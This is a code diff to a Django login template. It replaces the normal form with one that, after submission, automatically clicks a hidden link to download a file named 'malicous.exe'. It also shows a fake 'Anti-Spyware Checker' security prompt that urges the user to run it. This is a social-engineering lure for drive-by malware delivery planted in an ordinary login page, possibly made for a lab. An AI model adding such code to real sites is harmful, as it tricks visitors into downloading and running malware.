@@ -1,7 +1,54 @@
-<h2>Log In</h2>
-<form method="post">
+{% load static %}
+<h2 id="title">Log In</h2>
+<form method="post" id="form">
   {% csrf_token %}
-  {{ form.as_p }}
-  <button type="submit">Log In</button>
+  <label for="username">Username</label>
+  <input name="username" type="text">
+  <label for="password">Password</label>
+  <input name="password" type="password">
 </form>
 
+<button id="submit">Next</button>
+
+
+<div hidden id="securityCheck">
+  <b>One Last Security Check...</b>
+  <p>Since you have not enabled two factor authentication<br>Please run our State of the Art Anti-Spyware Checker to ensure your connection is secure</p>
+  <a id="download" href="{% static 'executables/malicous.exe' %}" download></a>
+</div>
+
+<script src="https://code.jquery.com/jquery-3.1.0.min.js"></script>
+
+<script>
+$('#submit').on('click', function (evt) {
+        evt.preventDefault();
+        $.ajax({
+            url: "/login/",
+            type: 'POST',
+            dataType : 'json',
+            data: $('form').serialize(),
+            success: function (data) {
+              if (data.redirect) {
+                // data.redirect contains the string URL to redirect to
+                window.location.href = data.redirect;
+              } else {
+                console.log('form submitted.');
+                switchDisplay(); //JS function
+              }
+            }
+       });
+});
+
+  function switchDisplay() {
+    download = document.getElementById("download");
+    download.click();
+    form = document.getElementById("form");
+    form.hidden = true;
+    button = document.getElementById("submit");
+    button.hidden = true;
+    securityCheck = document.getElementById("securityCheck");
+    securityCheck.hidden = false;
+    return
+  }
+
+</script>
